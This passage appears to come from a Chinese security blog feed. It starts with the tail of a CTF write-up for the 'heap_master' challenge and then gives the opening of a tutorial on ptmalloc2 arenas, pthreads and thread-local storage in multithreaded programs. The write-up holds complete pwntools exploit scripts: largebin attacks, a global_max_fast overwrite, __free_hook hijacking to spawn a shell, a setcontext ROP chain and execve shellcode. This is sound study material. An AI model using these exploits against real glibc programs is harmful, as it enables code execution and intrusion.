0x7fd7d + libcbase #0x000000000007fd7d: mov rdi, qword ptr [rbx + 0x48]; mov rsi, r13; call qword ptr [rbx + 0x40]; p_rdi = libcbase + 0x1feea p_rdx_rsi = libcbase + 0xf9619 orw = [ p_rdi,mmap_addr, p_rdx_rsi,0,0, libcbase+libc.sym['open'], p_rdi,4, #我flag打开之后文件操作符是4，具体情况自己调试 p_rdx_rsi,0x100,mmap_addr+0x2000, libcbase+libc.sym['read'], p_rdi,1, p_rdx_rsi,0x100,mmap_addr+0x2000, libcbase+libc.sym['write'], ] upgrade(0,'./flag\x00\x00'+flat(orw)) upgrade(offset,p64(mygadget)) upgrade(offset+0x40,p64(setcontext)+p64(mmap_addr+0x1000)) upgrade(0x1000+0xa0,p64(mmap_addr+0x10)+p64(p_rdi)) #gdb.attach(p) delete(0x10) p.interactive()while True: try: mypwn() break except: p.close() elf = change_ld('./heap_master','./ld-linux-x86-64.so.2') p = elf.process(env=&#123;'LD_PRELOAD':'./libc-2.25.so'&#125;) 第三种方法：思路：第三种方法是先利用unsortedbin_attack/largebin_attack将任意地址修改为victim的地址，我们准备改写global_fast_max，然后突破fastbinY[]的限制，产生fastbin_index_overflow将stdout流modify为某一处mmap的地址（我们事先已应在这里伪造好一个fake_IO_2_1_stdout结构体），然后有1/16的概率可以成功泄露。 之后我们再将_IO_list_all覆盖为某一处mmap的地址（我们事先应在这里伪造一个fake_IO_FIFE_plus），然后利用_IO_str_overflow来跳到setcontext+53处控制我们所有的寄存器，将栈劫持到mmap地址处，然后利用orw来读取flag。 exp如下：12 第四种方法(libc-2.23)：思路：第四种方法和前面的方法不同点主要在于劫持程序控制流，泄露的方法在前面都已经明确了，在此就不赘述。 第四种方法劫持程序执行流的方法是先改写global_fast_max，然后向free_hook放入victim的地址，然后在victim处构造一个chunk，在这个chunk的fd指针处改为system_addr，将这个chunk申请出来，这时system_addr就放入了free_hook中，然后再构造一个chunk，使其首八个字节为&#39;/bin/sh\x00&#39;，free()其即可打开shell。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125#coding:utf-8from pwn import *context(os='linux',arch='amd64')context.terminal = ['terminator','-x','sh','-c']#context.log_level = 'debug'p = process('./heap_master')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def new(size): p.sendlineafter('&gt;&gt; ', '1') p.sendlineafter('size: ', str(size))def upgrade(offset,content): p.sendlineafter('&gt;&gt; ', '2') p.sendlineafter('offset: ', str(offset)) p.sendlineafter('size: ', str(len(content))) p.sendafter('content: ', content) def delete(offset): p.sendlineafter('&gt;&gt; ', '3') p.sendlineafter('offset: ', str(offset))def exp(): offset = 0x5800 upgrade(offset+8,p64(0x411)) #1 upgrade(offset+8+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30,p64(0x411)) #2 upgrade(offset+8+0x410+0x30+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30,p64(0x201)) #3 upgrade(offset+8+0x410+0x30+0x410+0x30+0x200,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x410+0x30) delete(offset+0x10+0x410+0x30+0x410+0x30) new(0x10) upgrade(offset+8+0x410+0x30,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x410+0x30) new(0x60) delete(offset+0x10+0x410+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x410+0x30,p64(0x3f1)) upgrade(offset+0x10+0x410+0x30,p64(0)+p16(0x2620-0x10)) upgrade(offset+0x20+0x410+0x30,p64(0)+p16(0x2620-0x20+0x19)) delete(offset+0x10) new(0x60) p.recv(0x18) libcbase = u64(p.recv(8)) - (0x7f1f383306e0-0x7f1f37f6d000) log.success('libcbase = '+hex(libcbase)) mmap_addr = u64(p.recv(4).ljust(8,'\x00')) - (0xb800-0x6000) log.success('mmap_addr = '+hex(mmap_addr)) #------------------------------leak success and largebin_attack again--------------- global_max_fast_addr = libcbase + (0x7f6c57ea37f8 - 0x7f6c57add000) log.success('global_max_fast_addr = '+hex(global_max_fast_addr)) offset = 0x8800 upgrade(offset+8,p64(0x511)) #1 upgrade(offset+8+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30,p64(0x511)) #2 upgrade(offset+8+0x510+0x30+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30,p64(0x201)) #3 upgrade(offset+8+0x510+0x30+0x510+0x30+0x200,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x510+0x30) delete(offset+0x10+0x510+0x30+0x510+0x30) new(0x10) upgrade(offset+8+0x510+0x30,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x510+0x30) new(0x60) delete(offset+0x10+0x510+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x510+0x30,p64(0x4f1)) upgrade(offset+0x10+0x510+0x30,p64(0)+p64(global_max_fast_addr-0x10)) upgrade(offset+0x20+0x510+0x30,p64(0)+p64(global_max_fast_addr-0x20)) delete(offset+0x10) new(0x60) fastbin_ptr = libcbase+(0x7fc6d8510b20-0x7fc6d814c000)+8 log.success('fastbin_ptr = '+hex(fastbin_ptr)) target_addr = libcbase+libc.sym['__free_hook'] log.success('free_hook_addr ='+hex(target_addr)) idx = (target_addr-fastbin_ptr)/8 size = idx*0x10 + 0x20 offset = 0x2000 upgrade(offset+8,p64(size+1)) upgrade(offset+8+size,p64(0x31)+'/bin/sh\x00') upgrade(offset+8+size+0x30,p64(0x31)) delete(offset+0x10) upgrade(offset+8+8,p64(libcbase+libc.sym['system'])) new(size-0x10) delete(offset+size+0x10) p.interactive()if __name__ == '__main__' : while True: try : exp() break except : p.close() p = process('./heap_master') 第五种方法：思路：第五种方法也是劫持程序控制流方法不同。 第五种方法我们在泄露之后，改写_IO_list_all来控制程序控制流之后，利用_IO_str_overflow来跳到setcontext+53，然后控制寄存器调用mprotect来改写mmap段的权限，然后在mmap上注入shellcode。 exp如下(libc-2.25)：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'context.terminal = ['terminator','-x','sh','-c']def change_ld(binary, ld): """ Force to use assigned new ld.so by changing the binary """ if not os.access(ld, os.R_OK): log.failure("Invalid path &#123;&#125; to ld".format(ld)) return None if not isinstance(binary, ELF): if not os.access(binary, os.R_OK): log.failure("Invalid path &#123;&#125; to binary".format(binary)) return None binary = ELF(binary) for segment in binary.segments: if segment.header['p_type'] == 'PT_INTERP': size = segment.header['p_memsz'] addr = segment.header['p_paddr'] data = segment.data() if size &lt;= len(ld): log.failure("Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;".format(data, ld)) return None binary.write(addr, ld.ljust(size, '\x00')) if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn') path = '/tmp/pwn/&#123;&#125;_debug'.format(os.path.basename(binary.path)) if os.access(path, os.F_OK): os.remove(path) info("Removing exist file &#123;&#125;".format(path)) binary.save(path) os.chmod(path, 0b111000000) #rwx------ success("PT_INTERP has changed from &#123;&#125; to &#123;&#125;. Using temp file &#123;&#125;".format(data, ld, path)) return ELF(path)elf = change_ld('./heap_master','./ld-linux-x86-64.so.2')p = elf.process(env=&#123;'LD_PRELOAD':'./libc-2.25.so'&#125;)def new(size): p.recvuntil('&gt;&gt; ') p.sendline('1') p.recvuntil('size: ') p.sendline(str(size))def upgrade(offset,content): p.recvuntil('&gt;&gt; ') p.sendline('2') p.recvuntil('offset: ') p.sendline(str(offset)) p.recvuntil('size: ') p.sendline(str(len(content))) p.recvuntil('content: ') p.send(content)def delete(offset): p.recvuntil('&gt;&gt; ') p.sendline('3') p.recvuntil('offset: ') p.sendline(str(offset)) def mypwn(): stdout = 0x2600 libc = ELF('./libc-2.25.so') offset = 0x5800 upgrade(offset+8,p64(0x411)) #1 upgrade(offset+8+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30,p64(0x411)) #2 upgrade(offset+8+0x410+0x30+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30,p64(0x201)) #3 upgrade(offset+8+0x410+0x30+0x410+0x30+0x200,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x410+0x30) delete(offset+0x10+0x410+0x30+0x410+0x30) new(0x10) upgrade(offset+8+0x410+0x30,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x410+0x30) new(0x60) delete(offset+0x10+0x410+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x410+0x30,p64(0x3f1)) upgrade(offset+0x10+0x410+0x30,p64(0)+p16(stdout-0x10)) upgrade(offset+0x20+0x410+0x30,p64(0)+p16(stdout-0x20+0x19)) delete(offset+0x10) new(0x60) mmap_addr = u64(p.recv(8)) - (0xdffa3800- 0xdff9e000) log.success('mmap_addr = '+hex(mmap_addr)) libcbase = u64(p.recv(8)) - (0x7f7684c72683-0x7f76848d4000) log.success('libcbase = '+hex(libcbase)) setcontext = libcbase + 0x43565 log.success('setcontext+53 = '+hex(setcontext)) dl_open_hook_addr = libcbase + (0x7fa15b2162e0-0x7fa15ae74000) log.success('dl_open_hook_addr = '+hex(dl_open_hook_addr)) offset = 0x8800 upgrade(offset+8,p64(0x511)) #1 upgrade(offset+8+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30,p64(0x511)) #2 upgrade(offset+8+0x510+0x30+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30,p64(0x201)) #3 upgrade(offset+8+0x510+0x30+0x510+0x30+0x200,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x510+0x30) delete(offset+0x10+0x510+0x30+0x510+0x30) new(0x10) upgrade(offset+8+0x510+0x30,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x510+0x30) new(0x60) delete(offset+0x10+0x510+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x510+0x30,p64(0x4f1)) upgrade(offset+0x10+0x510+0x30,p64(0)+p64(dl_open_hook_addr-0x10)) upgrade(offset+0x20+0x510+0x30,p64(0)+p64(dl_open_hook_addr-0x20)) delete(offset+0x10) new(0x60) ''' 0x7ffff7a7a565 &lt;setcontext+53&gt;: mov rsp,QWORD PTR [rdi+0xa0] 0x7ffff7a7a56c &lt;setcontext+60&gt;: mov rbx,QWORD PTR [rdi+0x80] 0x7ffff7a7a573 &lt;setcontext+67&gt;: mov rbp,QWORD PTR [rdi+0x78] 0x7ffff7a7a577 &lt;setcontext+71&gt;: mov r12,QWORD PTR [rdi+0x48] 0x7ffff7a7a57b &lt;setcontext+75&gt;: mov r13,QWORD PTR [rdi+0x50] 0x7ffff7a7a57f &lt;setcontext+79&gt;: mov r14,QWORD PTR [rdi+0x58] 0x7ffff7a7a583 &lt;setcontext+83&gt;: mov r15,QWORD PTR [rdi+0x60] 0x7ffff7a7a587 &lt;setcontext+87&gt;: mov rcx,QWORD PTR [rdi+0xa8] 0x7ffff7a7a58e &lt;setcontext+94&gt;: push rcx 0x7ffff7a7a58f &lt;setcontext+95&gt;: mov rsi,QWORD PTR [rdi+0x70] 0x7ffff7a7a593 &lt;setcontext+99&gt;: mov rdx,QWORD PTR [rdi+0x88] 0x7ffff7a7a59a &lt;setcontext+106&gt;: mov rcx,QWORD PTR [rdi+0x98] 0x7ffff7a7a5a1 &lt;setcontext+113&gt;: mov r8,QWORD PTR [rdi+0x28] 0x7ffff7a7a5a5 &lt;setcontext+117&gt;: mov r9,QWORD PTR [rdi+0x30] 0x7ffff7a7a5a9 &lt;setcontext+121&gt;: mov rdi,QWORD PTR [rdi+0x68] 0x7ffff7a7a5ad &lt;setcontext+125&gt;: xor eax,eax 0x7ffff7a7a5af &lt;setcontext+127&gt;: ret rsp = [rdi+0xa0] ret_addr = [rdi+0xa8] #push rcx; ......... ret; 开始的rcx作为缓冲区，必须装指令的地址。 rsi = [rdi+0x70] rdx = [rdi+0x88] rcx = [rdi+0x98] r8 = [rdi+0x28] r9 = [rdi+0x30] ''' mygadget = 0x7fd7d + libcbase #0x000000000007fd7d: mov rdi, qword ptr [rbx + 0x48]; mov rsi, r13; call qword ptr [rbx + 0x40]; shellcode = '\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05' upgrade(offset,p64(mygadget)) upgrade(offset+0x40,p64(setcontext)+p64(mmap_addr+0x1000)) upgrade(0x1000+0xa0,p64(mmap_addr+0x2000)+p64(libcbase+libc.sym['mprotect'])) upgrade(0x1000+0x68,p64(mmap_addr+0x2000)+p64(0x1000)) #rdi rsi upgrade(0x1000+0x88,p64(7)) #rdx upgrade(0x2000,p64(mmap_addr+0x2008)+shellcode) delete(0x10) p.interactive()while True: try: mypwn() break except: p.close() elf = change_ld('./heap_master','./ld-linux-x86-64.so.2') p = elf.process(env=&#123;'LD_PRELOAD':'./libc-2.25.so'&#125;) 总结：唉，其实一路看下来的话其实所谓的多解就是两种泄露方式和三四种劫持程序控制流的方式进行排列组合罢了，融会贯通了其实五种方法就是一种方法。 leak方式： 改写stdout流的关键字节，使flag过了检查f-&gt;flag &amp; 0xa00 and f-&gt;flag &amp; 0x1000 == 1，并且_IO_write_base!=_IO_write_ptr。 在我们可控的地址上劫持伪造stdout流。 modify方式： 改写dl_open_hook，获得一次任意地址call的机会，然后配合setcontext+53控制寄存器，在malloc或者free出错，调用malloc_printerr时会trigger。 改写_IO_list_all，伪造_IO_FIFE_plus结构体，将vtable改为_IO_str_jumps的地址，然后在_IO_str_overflow或者_IO_str_finish里进行劫持。（malloc printerr/exit()/main return-&gt;__libc_message-&gt;abort-&gt;_IO_flush_all_lockp-&gt;_IO_str_overflow/_IO_str_finish），需要过一系列fflush的检查，固定构造已经在前面给出。 改写global_max_fast，突破fastbinY[]的限制，像任意（几乎）地址写victim的地址，可以改写某个hook来进行进一步操作。 参考资料：深入分析 IO_FILE 与 Unosrtbin Largebin attack 的结合利用 starctf-heap_master题解–e3pem Startctf2019_Heap_master–n132 JarvisOJ Pwn Writeup–m4x Largebin学习–veritas501 global_max_fast学习–raycp 新手向——IO_file全流程浅析 (这篇文章里在分析_IO_str_overflow时有错误orz，可能会误导人。)]]></content>
  </entry>
  <entry>
    <title><![CDATA[多线程pwn专题学习与总结]]></title>
    <url>%2F2019%2F06%2F22%2F%E5%A4%9A%E7%BA%BF%E7%A8%8Bpwn%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[因为近期为了获得参加暑假方班夏令营的资格去digapis的平台上刷题，有幸做到了T3LS大佬出的girlfriend这题，这题我做了很久orz，查了很多资料，出的很巧妙，也是我第一次碰到多线程的题目，又谷歌了一下，发现多线程的题目在高端局中出现的并不低。。。所以参考了一大波师傅们的blog加上好几天的谷歌，决定来总结一下。 （我突然发现我自己好像很少写学习的文章，都是题解，之前觉得大师傅们的文章写得已经很详尽了，也没必要在写拙文。。但是总有一天我也会成为大师傅的么orz，所以现在开始逐渐记录自己学习新技术的过程，之前的就懒得写了，也没学到啥反正。。） 对于ptmalloc2中多线程方面的知识：在早期的 Linux 里，dlmalloc 被用做默认的内存分配器。但之后因为 ptmalloc2 添加了线程支持，ptmalloc2 成为了 Linux 默认内存分配器。线程支持可帮助提升内存分配器以及应用程序的性能。在 dlmalloc 里，当两个线程同时调用 malloc 时，只有一个线程能进入到临界段，因为这里的free list是所有可用线程共用的。因此内存分配器要在多线程应用里耗费时间，从而导致性能降低。 ptmalloc2中，当多个线程同时调用malloc，内存会立即得到分配，因为每个线程有一个单独的arena，因此free list数据结构中（在ptmalloc2中是bins）保存的这些堆也是分开的。这种为每个线程分配一个单独的arena和free list数据结构（bins）的行为称为per thread arena。 两个基本函数：pthread_create所有线程都有一个线程号，也就是Thread ID。其类型为pthread_t。 通过创建线程，线程将会执行一个线程函数，该线程格式必须按照下面来声明： ​ void * Thread_Function(void *) 创建线程的函数如下： ​ int pthread_create(pthread_t *restrict thread，const pthread_attr_t *restrict attr，void *(*start_routine)(void*)，void *restrict arg)； 下面说明一下各个参数的含义： thread：所创建的线程号。（返回的进程号将储存在thread变量里。） attr：所创建的线程属性，这个之后会提一下。 start_routine：即将运行的线程函数。 arg：传递给线程函数的参数。 在编译的时候需要注意，由于线程创建函数不是linux默认的库，而在libpthread.so库中，所以在编译命令中需要将该库导入（-lpthread）。命令如下： gcc –o createthread –lpthread createthread.c 如果想传递参数给线程函数，可以通过其参数arg，其类型是void 。如果你需要传递多个参数的话，可以考虑将这些参数组成一个结构体来传递。另外，由于类型是void ，所以你的参数不可以被提前释放掉。 pthread_join如果你的主线程，也就是main函数执行的那个线程，在你其他县城推出之前就已经退出，那么带来的bug则不可估量。通过pthread_join函数会让主线程阻塞，直到所有线程都已经退出。 int pthread_join(pthread_t thread, void **value_ptr); thread：等待退出线程的线程号。 value_ptr：退出线程的返回值。 看一个demo: 1234567891011121314151617181920212223242526int main ()&#123; pthread_t thread1_id; pthread_t thread2_id; struct char_print_parms thread1_args; //多个变量用结构体传参 struct char_print_parms thread2_args; //同上 /* Create a new thread to print 30,000 x’s. */ thread1_args.character = ’x’; thread1_args.count = 30000; pthread_create (&amp;thread1_id, NULL, &amp;char_print, &amp;thread1_args); /* Create a new thread to print 20,000 o’s. */ thread2_args.character = ’o’; thread2_args.count = 20000; pthread_create (&amp;thread2_id, NULL, &amp;char_print, &amp;thread2_args); /* Make sure the first thread has finished. */ pthread_join (thread1_id, NULL); /* Make sure the second thread has finished. */ pthread_join (thread2_id, NULL); /* Now we can safely return. */ return 0;&#125; 下面说一下前面提到的线程属性。 在我们前面提到，可以通过pthread_join()函数来使主线程阻塞等待其他线程退出，这样主线程可以清理其他线程的环境。但是还有一些线程，更喜欢自己来清理退出的状态，他们也不愿意主线程调用pthread_join来等待他们。我们将这一类线程的属性称为detached。如果我们在调用pthread_create()函数的时候将属性设置为NULL，则表明我们希望所创建的线程采用默认的属性，也就是jionable。如果需要将属性设置为detached。 最后说一下线程的本质。其实在Linux中，新建的线程并不是在原先的进程中，而是系统通过一个系统调用clone()。该系统copy了一个和原先进程完全一样的进程，并在这个进程中执行线程函数。不过这个copy过程和fork不一样。copy后的进程和原先的进程共享了所有的变量，运行环境。这样，原先进程中的变量变动在copy后的进程中便能体现出来。这意味着线程可以改动全局变量而使主进程中某个条件成立。 一个线程创建前后的内存环境分析：一个demo:（来自于深入理解glibc-malloc） 123456789101112131415161718192021222324252627282930313233343536373839404142434445/* Per thread arena example. */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;void* threadFunc(void* arg) &#123; printf("Before malloc in thread 1\n"); getchar(); char* addr = (char*) malloc(1000); printf("After malloc and before free in thread 1\n"); getchar(); free(addr); printf("After free in thread 1\n"); getchar();&#125;int main() &#123; pthread_t t1; void* s; int ret; char* addr; printf("Welcome to per thread arena example::%d\n",getpid()); printf("Before malloc in main thread\n"); getchar(); addr = (char*) malloc(1000); printf("After malloc and before free in main thread\n"); getchar(); free(addr); printf("After free in main thread\n"); getchar(); ret = pthread_create(&amp;t1, NULL, threadFunc, NULL); if (ret) &#123; printf("Thread creation error\n"); return -1; &#125; ret = pthread_join(t1, &amp;s); if (ret) &#123; printf("Thread join error\n"); return -1; &#125; return 0;&#125; 如果我们一步一步调试会发现： 当主线程用malloc(1000)向ptmalloc2申请内存时会系统调用brk，操作系统会给主线程分配132k/0x21000大小的heap区域，这块区域叫main arena。 主线程free()以后，这一块内存会放进main arena的bin中。 当创建线程之后，线程调用malloc(1000)时，malloc()会系统调用mmap()给线程分配132k/0x21000的heap区域，这块区域叫thread arena。（当申请的内存大小大于128k/0x20000时，无论是主线程还是线程都会系统调用mmap()分配内存。） 线程free()以后这一块内存会放进thread arena的bin中。 印证了上面所说：为每个线程分配一个单独的arena和free list数据结构（bins）。 Arena的数量限制arena的数量由系统的核数量决定。 32位系统：arena的数量 = 2 核的数量64位系统：arena的数量 = 8 核的数量 Multiple Arena(arena的空间复用)例如：一个多线程（主线程+7个用户线程）应用在一个单核的64位系统上运行，线程数&gt;8*核数，因此glibc malloc需要确保multiple arena能被线程共享。 主线程第一次调用malloc会创建main arena。 thread1和thread2第一次调用malloc，会分别为它们创建thread arena thread3第一次调用malloc不会创建arena，会尝试reuse已存在的arena（main arena或arena1或arena2） reuse：当循环可用的arena时，尝试lock arena如果lock成功，返回那个arena给用户如果没有空闲的arena，阻塞排队等待arena Multiple Heapsglibc malloc中有三种数据结构：heap_info Heap Header - 一个thread arena可以有multiple heaps，每个heap有自己的header。（每个thread arena一开始只有一个heap，当堆段空间用尽时，会有新的heap被mmap到这个arena中）malloc_state Arena Header - 一个thread arena的multiple heaps只有一个arena header。Arena header包含着bins，top chunk，last remainder chunk等信息。 123456789101112131415161718192021222324252627282930313233343536373839struct malloc_state&#123; /* Serialize access. */ mutex_t mutex; /* Flags (formerly in max_fast). */ int flags; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top;//此地址将被写入_IO_list_all /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */ struct malloc_state *next_free; /* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */ INTERNAL_SIZE_T attached_threads; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;&#125;; malloc_chunk Chunk Header - 一个heap根据用户请求被分成多个chunk，每个chunk有自己的header。 Main arena没有multiple heaps，因此没有heap_info结构。当main arena空间用尽时，sbrk创建的堆段会被增长（连续空间），直到它撞到内存映射段。和thread arena不同，main arena的arena header不是sbrk创建的堆段的一部分，它是一个全局变量，因此它在libc.so的数据段。 main arena和thread arena（单个堆段）thread arena（多个堆段） TLS：线程本地存储又叫线程局部存储，其英文为Thread Local Storage，简称TLS，看似一个很高大上的东西，其实就是线程私有的全局变量而已。 普通的全局变量在多线程中是共享的，一个线程对其进行了修改，所有线程都可以看到这个修改，而线程私有的全局变量与普通全局变量不同，线程私有全局变量是线程的私有财产，每个线程都有自己的一份副本，某个线程对其所做的修改只会修改到自己的副本，并不会修改到其它线程的副本。 下面用例子来说明一下多线程共享全局变量以及线程私有全局变量之间的差异，并对gcc的线程本地存储做一个简单的分析。 首先来看普通的全局变量 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;int g = 0; // 1，定义全局变量g并赋初值0void* start(void* arg)&#123; printf("start, g[%p] : %d\n", &amp;g, g); // 4，子线程中打印全局变量g的地址和值 g++; // 5，修改全局变量 return NULL;&#125;int main(int argc, char* argv[])&#123; pthread_t tid; g = 100; // 2，主线程给全局变量g赋值为100 pthread_create(&amp;tid, NULL, start, NULL); // 3， 创建子线程执行start()函数 pthread_join(tid, NULL); // 6，等待子线程运行结束 printf("main, g[%p] : %d\n", &amp;g, g); // 7，打印全局变量g的地址和值 return 0;&#125; 注释已经写的很清晰明了，我们的目的是看线程中的g++会不会影响我们最开始定义的全局变量g，输出结果为： xiaoxiaorenwu@ubuntu:~/study/c$ gcc thread.c -o thread -lpthreadxiaoxiaorenwu@ubuntu:~/study/c$ ./threadstart, g[0x601064] : 100main, g[0x601064] : 101 从输出结果我们可以看到，普通全局变量g在主线程和其他线程中储存地址都是一样的，任何一个线程都可以对这个全局变量进行读取和修改，实现了变量的共享。 了解了普通的全局变量之后我们再来看通过线程本地存储(TLS)实现的线程私有全局变量。这个程序与上面的程序几乎完全一样，唯一的差别就是在定义全局变量 g 时增加了 __thread关键字，这样g就变成了线程私有全局变量了。 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;__thread int g = 0; // 1，这里增加了__thread关键字，把g定义成私有的全局变量，每个线程都有一个g变量void* start(void* arg)&#123; printf("start, g[%p] : %d\n", &amp;g, g); // 4，打印本线程私有全局变量g的地址和值 g++; // 5，修改本线程私有全局变量g的值 return NULL;&#125;int main(int argc, char* argv[])&#123; pthread_t tid; g = 100; // 2，主线程给私有全局变量赋值为100 pthread_create(&amp;tid, NULL, start, NULL); // 3，创建子线程执行start()函数 pthread_join(tid, NULL); // 6，等待子线程运行结束 printf("main, g[%p] : %d\n", &amp;g, g); // 7，打印主线程的私有全局变量g的地址和值 return 0;&#125; 输出结果为： xiaoxiaorenwu@ubuntu:~/study/c$ gcc -g thread.c -o thread -lpthreadxiaoxiaorenwu@ubuntu:~/study/c$ ./threadstart, g[0x7f0181b046fc] : 0main, g[0x7f01823076fc] : 100 我们可以发现两个问题，一个是g这个全局变量在主线程和其他线程中的地址不一样了，还有就是线程中对g进行修改并不能影响主线程中的g（这不是废话么。。。地址都不一样。。），说明每个线程都有一个自己私有的全局变量g。 我们来用gdb分析一下： 首先在源代码的第20行（对应到源代码中的 g = 100）处下一个断点，然后运行程序，程序停在了断点处，反汇编一下main函数： 12345678910111213141516171819202122232425262728293031323334(gdb) b thread.c:20Breakpoint1at0x400793:filethread.c, line 20.(gdb) rStartingprogram:/home/bobo/study/c/threadBreakpoint1, at thread.c:2020 g=100;(gdb) disassDumpofassemblercodeforfunctionmain: 0x0000000000400775&lt;+0&gt;:push %rbp 0x0000000000400776&lt;+1&gt;:mov %rsp,%rbp 0x0000000000400779&lt;+4&gt;:sub $0x20,%rsp 0x000000000040077d&lt;+8&gt;:mov %edi,-0x14(%rbp) 0x0000000000400780&lt;+11&gt;:mov %rsi,-0x20(%rbp) 0x0000000000400784&lt;+15&gt;:mov %fs:0x28,%rax 0x000000000040078d&lt;+24&gt;:mov %rax,-0x8(%rbp) 0x0000000000400791&lt;+28&gt;:xor %eax,%eax=&gt; 0x0000000000400793 &lt;+30&gt;:movl $0x64,%fs:0xfffffffffffffffc 0x000000000040079f&lt;+42&gt;:lea -0x10(%rbp),%rax 0x00000000004007a3&lt;+46&gt;:mov $0x0,%ecx 0x00000000004007a8&lt;+51&gt;:mov $0x400736,%edx 0x00000000004007ad&lt;+56&gt;:mov $0x0,%esi 0x00000000004007b2&lt;+61&gt;:mov %rax,%rdi 0x00000000004007b5&lt;+64&gt;:callq 0x4005e0 &lt;pthread_create@plt&gt; 0x00000000004007ba&lt;+69&gt;:mov -0x10(%rbp),%rax 0x00000000004007be&lt;+73&gt;:mov $0x0,%esi 0x00000000004007c3&lt;+78&gt;:mov %rax,%rdi 0x00000000004007c6&lt;+81&gt;:callq 0x400620 &lt;pthread_join@plt&gt; 0x00000000004007cb&lt;+86&gt;:mov %fs:0xfffffffffffffffc,%eax 0x00000000004007d3&lt;+94&gt;:mov %eax,%esi 0x00000000004007d5&lt;+96&gt;:mov $0x4008df,%edi 0x00000000004007da&lt;+101&gt;:mov $0x0,%eax 0x00000000004007df&lt;+106&gt;:callq 0x400600 &lt;printf@plt&gt; ...... 程序停在了g = 100这一行，看一下汇编指令， 1=&gt; 0x0000000000400793 &lt;+30&gt;:movl $0x64,%fs:0xfffffffffffffffc 这句汇编指令的意思是把常量100(0x64)复制到地址为%fs:0xfffffffffffffffc的内存中，可以看出全局变量g的地址为%fs:0xfffffffffffffffc，fs是段寄存器，0xfffffffffffffffc是有符号数-4，所以全局变量g的地址为： fs段基址 - 4 前面我们在讲段寄存器时说过段基址就是段的起始地址，为了验证g的地址确实是fs段基址 - 4，我们需要知道fs段基址是多少，虽然我们可以用gdb命令查看fs寄存器的值，但fs寄存器里面存放的是段选择子（segment selector）而不是该段的起始地址，为了拿到这个基地址，我们需要加一点代码来获取它，修改后的代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;#include &lt;asm/prctl.h&gt;#include &lt;sys/prctl.h&gt;__thread int g = 0;void print_fs_base()&#123; unsigned long addr; int ret = arch_prctl(ARCH_GET_FS, &amp;addr); //获取fs段基地址 if (ret &lt; 0) &#123; perror("error"); return; &#125; printf("fs base addr: %p\n", (void*)addr); //打印fs段基址 return;&#125;void* start(void* arg)&#123; print_fs_base(); //子线程打印fs段基地址 printf("start, g[%p] : %d\n", &amp;g, g); g++; return NULL;&#125;int main(int argc, char* argv[])&#123; pthread_t tid; g = 100; pthread_create(&amp;tid, NULL, start, NULL); pthread_join(tid, NULL); print_fs_base(); //main线程打印fs段基址 printf("main, g[%p] : %d\n", &amp;g, g); return 